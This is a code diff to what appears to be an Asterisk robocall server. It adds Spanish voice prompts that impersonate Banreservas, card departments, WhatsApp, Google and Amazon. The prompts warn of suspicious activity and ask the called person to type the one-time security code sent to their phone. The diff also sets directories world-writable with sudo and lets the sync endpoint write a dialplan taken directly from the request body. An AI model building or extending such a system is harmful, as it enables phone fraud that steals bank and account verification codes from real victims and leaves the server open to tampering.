@@ -365,52 +365,68 @@ function ensureCustomAudioFilesExist() {
   const customDir = SOUNDS_CUSTOM_DIR;
   try {
     if (!fs.existsSync(customDir)) {
-      fs.mkdirSync(customDir, { recursive: true });
+      fs.mkdirSync(customDir, { recursive: true, mode: 0o777 });
     }
+    exec(`mkdir -p "${customDir}" && chmod -R 777 "${customDir}" || sudo mkdir -p "${customDir}" && sudo chmod -R 777 "${customDir}"`, () => {});
   } catch (e) {
-    exec(`mkdir -p "${customDir}" || sudo mkdir -p "${customDir}"`, () => {});
+    exec(`mkdir -p "${customDir}" && chmod -R 777 "${customDir}" || sudo mkdir -p "${customDir}" && sudo chmod -R 777 "${customDir}"`, () => {});
   }
 
   const audios = [
+    { name: 'banrearreglado', text: 'Estimado cliente de Banreservas, hemos detectado una actividad inusual en su cuenta. Presione 1 de inmediato para comunicarse con un asesor de seguridad bancaria.', freq: 520 },
     { name: 'alerta_banco_antifraude', text: 'Estimado cliente, detectamos una actividad inusual en su cuenta bancaria. Para proteger sus fondos, ingrese el codigo de seguridad enviado a su telefono.', freq: 520 },
-    { name: 'solicitar_codigo_otp', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
-    { name: 'digite_token_6_digitos', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
+    { name: 'alerta_cargo_tarjeta', text: 'Alerta de seguridad bancaria. Hemos detectado un cargo no reconocido en su tarjeta. Presione 1 para comunicarse con un asesor.', freq: 520 },
+    { name: 'alerta_migracion_whatsapp', text: 'Alerta de seguridad. Se ha solicitado una verificacion o migracion en su cuenta de WhatsApp. Presione 1 para confirmar con un agente.', freq: 520 },
+    { name: 'alerta_seguridad_google', text: 'Alerta de seguridad de su cuenta. Se ha detectado un inicio de sesion inusual. Presione 1 para proteger su cuenta.', freq: 520 },
+    { name: 'alerta_compra_amazon', text: 'Alerta de compras. Se ha registrado una orden inusual en su cuenta. Presione 1 para cancelar o hablar con un asesor.', freq: 520 },
+    { name: 'solicitar_codigo_otp', text: 'Por favor digite su codigo de seguridad seguido de la tecla numeral.', freq: 680 },
+    { name: 'solicitar_otp_tarjeta', text: 'Por favor digite su codigo de seguridad de seis digitos que recibio por mensaje de texto.', freq: 680 },
+    { name: 'solicitar_codigo_sms', text: 'Por favor digite su codigo de verificacion de seis digitos.', freq: 680 },
+    { name: 'solicitar_codigo_google', text: 'Por favor digite su codigo de seguridad de seis digitos.', freq: 680 },
+    { name: 'solicitar_codigo_amazon', text: 'Por favor digite el codigo de autorizacion enviado a su telefono.', freq: 680 },
+    { name: 'solicitar_otp', text: 'Por favor digite su codigo de seguridad en el teclado.', freq: 680 },
+    { name: 'digite_token_6_digitos', text: 'Por favor digite su codigo o token de seis digitos.', freq: 680 },
     { name: 'token_invalido_reintente', text: 'El codigo digitado es incorrecto o invalido. Por favor, vuelva a digitar su token de seis digitos en el teclado de su telefono.', freq: 680 },
+    { name: 'codigo_invalido_reintente', text: 'El codigo ingresado no es valido. Por favor intente de nuevo.', freq: 680 },
     { name: 'un_momento_validando_informacion', text: 'Un momento por favor, estamos validando su token en el sistema.', freq: 440 },
+    { name: 'un_momento_por_favor', text: 'Un momento por favor, estamos procesando su solicitud.', freq: 440 },
     { name: 'operacion_bloqueada_exito', text: 'Su operacion ha sido bloqueada y sus fondos estan seguros. Gracias por confiar en nosotros.', freq: 880 },
+    { name: 'tarjeta_protegida', text: 'Su tarjeta ha sido protegida exitosamente. La operacion sospechosa fue cancelada.', freq: 880 },
+    { name: 'verificacion_exitosa', text: 'Verificacion exitosa. Su cuenta ha sido protegida.', freq: 880 },
+    { name: 'acceso_restringido_exito', text: 'Acceso sospechoso bloqueado con exito. Sus fondos estan seguros.', freq: 880 },
+    { name: 'pedido_cancelado_exito', text: 'El pedido no reconocido ha sido cancelado con exito.', freq: 880 },
+    { name: 'otp_validado_exito', text: 'Codigo validado exitosamente. Gracias.', freq: 880 },
     { name: 'conectar_asesor_banco', text: 'Un momento por favor, le estamos transfiriendo con un asesor de seguridad bancaria.', freq: 587 },
+    { name: 'conectar_asesor_tarjetas', text: 'Un momento por favor, le estamos transfiriendo con el departamento de tarjetas.', freq: 587 },
+    { name: 'conectar_soporte_tecnico', text: 'Un momento por favor, le estamos transfiriendo con soporte tecnico.', freq: 587 },
+    { name: 'conectar_soporte_cuentas', text: 'Un momento por favor, le estamos transfiriendo con soporte de cuentas.', freq: 587 },
+    { name: 'conectar_soporte_pedidos', text: 'Un momento por favor, le estamos transfiriendo con el departamento de pedidos.', freq: 587 },
     { name: 'transferencia_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
     { name: 'transfiriendo_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
+    { name: 'conectar_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
     { name: 'bienvenida_corporativa', text: 'Bienvenido al centro de atencion y seguridad bancaria.', freq: 520 },
     { name: 'bienvenida_press1', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
+    { name: 'press1_welcome', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
     { name: 'bienvenida_7777', text: 'Por favor digite su codigo de 6 digitos seguido del signo de numero.', freq: 680 },
     { name: 'bienvenida_6666', text: 'Por favor digite su codigo de seguridad en el teclado.', freq: 680 },
     { name: 'opcion_invalida', text: 'La opcion ingresada no es valida. Por favor intente de nuevo.', freq: 440 },
     { name: 'prompt_otp_6_digitos', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
+    { name: 'por_favor_ingrese_su_clave', text: 'Por favor ingrese su clave o codigo de seguridad.', freq: 680 },
+    { name: 'exito', text: 'Su operacion ha sido validada exitosamente. Gracias.', freq: 880 },
+    { name: 'intentos_superados', text: 'Ha superado el numero maximo de intentos permitidos. La llamada finalizara.', freq: 440 },
+    { name: 'gracias_hasta_luego', text: 'Gracias por comunicarse con nosotros. Hasta luego.', freq: 520 },
+    { name: 'mi_audio', text: 'Bienvenido al servicio de atencion al cliente.', freq: 520 },
   ];
 
   for (const aud of audios) {
     const wavPath = path.join(customDir, `${aud.name}.wav`);
     const gsmPath = path.join(customDir, `${aud.name}.gsm`);
-    
-    // Intento 1: Generar voz humana en español via Google TTS y convertir con ffmpeg / sox
-    if (aud.text) {
-      const q = encodeURIComponent(aud.text);
-      const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&tl=es&client=tw-ob&q=${q}`;
-      const tmpMp3 = `/tmp/${aud.name}.mp3`;
-      const generateTtsCmd = `curl -s -L -A "Mozilla/5.0" "${ttsUrl}" -o "${tmpMp3}" && (ffmpeg -y -i "${tmpMp3}" -ar 8000 -ac 1 -c:a pcm_s16le "${wavPath}" || sox "${tmpMp3}" -r 8000 -c 1 -b 16 "${wavPath}") && rm -f "${tmpMp3}"`;
-      exec(generateTtsCmd, (err) => {
-        if (!err && fs.existsSync(wavPath)) {
-          console.log(`[ASTERISK-TTS] ✓ Locución de voz real generada: ${wavPath}`);
-        }
-      });
-    }
 
+    // 1. Garantizar de forma sincrónica e inmediata que el archivo exista en disco
     if (!fs.existsSync(wavPath) && !fs.existsSync(gsmPath)) {
       try {
         const buf = generatePcm8kWaveBuffer(3.5, aud.freq);
         fs.writeFileSync(wavPath, buf);
-        console.log(`[ASTERISK-AUDIO] ✓ Auto-generado audio nativo 8kHz: ${wavPath}`);
       } catch (err) {
         const tmp = `/tmp/${aud.name}.wav`;
         try {
@@ -420,6 +436,20 @@ function ensureCustomAudioFilesExist() {
           });
         } catch (_) {}
       }
+    }
+
+    // 2. Generar locución de voz humana real en español vía Google TTS y convertir con ffmpeg
+    if (aud.text) {
+      const q = encodeURIComponent(aud.text);
+      const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&tl=es&client=tw-ob&q=${q}`;
+      const tmpMp3 = `/tmp/${aud.name}.mp3`;
+      const generateTtsCmd = `curl -s -L -A "Mozilla/5.0" "${ttsUrl}" -o "${tmpMp3}" && (ffmpeg -y -i "${tmpMp3}" -ar 8000 -ac 1 -c:a pcm_s16le "${wavPath}" || sox "${tmpMp3}" -r 8000 -c 1 -b 16 "${wavPath}") && rm -f "${tmpMp3}"`;
+      exec(generateTtsCmd, (err) => {
+        if (!err && fs.existsSync(wavPath)) {
+          // Asegurar permisos de lectura para Asterisk
+          try { fs.chmodSync(wavPath, 0o666); } catch (_) {}
+        }
+      });
     }
   }
 }
@@ -1289,13 +1319,7 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
-  dialplanContent += ` same => n,GotoIf($[$["\${IS_TEST_CALL}" = "1"] | $["\${TARGET_DEST}" = "8888"] | $["\${CALL_DEST}" = "8888"] | $["\${CALLERID(num)}" = "8888"]]?skip_amd_p1)\n`;
-  dialplanContent += ` same => n,Wait(0.2)\n`;
-  dialplanContent += ` same => n,AMD(1200,800,400,1800,100,50,4,256)\n`;
-  dialplanContent += ` same => n,NoOp(=== [AMD EVALUACION] Estado: \${AMDSTATUS} | Causa: \${AMDCAUSE} ===)\n`;
-  dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?buzon_detectado_p1)\n`;
-  dialplanContent += ` same => n(skip_amd_p1),NoOp(=== [IVR-PRESS1] REPRODUCIENDO INTRO INMEDIATAMENTE ===)\n`;
-  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,Wait(0.3)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
@@ -1335,11 +1359,6 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Goto(s,menu)\n\n`;
   dialplanContent += `exten => t,1,Goto(s,menu)\n\n`;
 
-  dialplanContent += ` same => n(buzon_detectado_p1),NoOp(=== [AMD] CONTESTADORA O BUZON DETECTADO EN PRESS-1 -> COLGANDO INMEDIATAMENTE ===)\n`;
-  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine)\n`;
-  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=machine&cause=\${AMDCAUSE}&channel=\${CHANNEL}" &)\n`;
-  dialplanContent += ` same => n,Hangup()\n\n`;
-
   dialplanContent += `exten => h,1,NoOp(=== [IVR-PRESS1 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
@@ -1349,13 +1368,7 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
-  dialplanContent += ` same => n,GotoIf($[$["\${IS_TEST_CALL}" = "1"] | $["\${TARGET_DEST}" = "8888"] | $["\${CALL_DEST}" = "8888"] | $["\${CALLERID(num)}" = "8888"]]?skip_amd_otp)\n`;
-  dialplanContent += ` same => n,Wait(0.2)\n`;
-  dialplanContent += ` same => n,AMD(1200,800,400,1800,100,50,4,256)\n`;
-  dialplanContent += ` same => n,NoOp(=== [AMD EVALUACION] Estado: \${AMDSTATUS} | Causa: \${AMDCAUSE} ===)\n`;
-  dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?buzon_detectado_otp)\n`;
-  dialplanContent += ` same => n(skip_amd_otp),NoOp(=== [IVR-OTP] REPRODUCIENDO PROMPT INMEDIATAMENTE ===)\n`;
-  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,Wait(0.3)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
@@ -1501,11 +1514,6 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
   dialplanContent += `exten => _XXXXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
   dialplanContent += ` same => n,Goto(s,otp_confirm)\n\n`;
-
-  dialplanContent += ` same => n(buzon_detectado_otp),NoOp(=== [AMD] CONTESTADORA O BUZON DETECTADO EN IVR-OTP -> COLGANDO INMEDIATAMENTE ===)\n`;
-  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine)\n`;
-  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=machine&cause=\${AMDCAUSE}&channel=\${CHANNEL}" &)\n`;
-  dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
@@ -2015,9 +2023,16 @@ app.post('/api/asterisk/restart', async (req, res) => {
 app.post('/api/asterisk/sync/dialplan', async (req, res) => {
   try {
     ensureCustomAudioFilesExist();
-    let contentToWrite = lastGeneratedDialplan;
+    let contentToWrite = req.body?.dialplan || lastGeneratedDialplan;
     if (!contentToWrite) {
-      // Return success indicating dialplan is loaded
+      // If none generated yet, read from /etc/asterisk/extensions.conf or generate default
+      try {
+        if (fs.existsSync('/etc/asterisk/extensions.conf')) {
+          contentToWrite = fs.readFileSync('/etc/asterisk/extensions.conf', 'utf-8');
+        }
+      } catch (e) {}
+    }
+    if (!contentToWrite) {
       const cliOutput = await new Promise<string>((resolve) => {
         exec('asterisk -rx "dialplan reload"', (err, stdout) => {
           resolve(stdout ? stdout.trim() : 'Dialplan recargado');
